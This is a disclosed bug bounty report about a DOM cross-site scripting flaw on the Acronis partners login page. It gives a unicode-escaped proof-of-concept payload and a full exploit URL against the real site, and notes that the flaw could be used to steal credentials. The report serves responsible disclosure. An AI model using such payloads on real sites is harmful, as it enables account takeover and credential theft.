# XSS on https://partners.acronis.com/

## Report Details
- **Report ID**: 979204
- **URL**: https://hackerone.com/reports/979204
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-09-11T06:11:22.104Z
- **Disclosed**: 2021-06-17T01:28:32.571Z

## Reporter
- **Username**: yash_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Hello,

I found DOM XSS on login page of https://partners.acronis.com/
Open this URL https://partners.acronis.com/en-us/profile/login.html?-back=test123"> and search for `var back =`. Here input is HTML encoded but from that reflected value, element is created and appended to the form. 
{F983552}
We can use JavaScript's unicode escaping to bypass this..
  
  

## Steps To Reproduce
  1. For this payload `"><img src=x onerror=alert(1)><x y="` we have to replace `"` with `\u0022`, `>` with `\u003e` and `<` with `\u003c`.
So the payload will be `\u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022`
  1. Open this URL   
   ```
https://partners.acronis.com/en-us/profile/login.html?-back=\u0022\u003e\u003cimg+src=x+onerror=alert(1)\u003e\u003cx+y=\u0022
    ```
  1. And you'll see alert dialog.  
{F983553}

## Impact

Attacker can execute JavaScript code on users who open the link. This XSS is in the login page so it can be used to get someone's credentials..

## Attachments
- 1.png
- 2.png
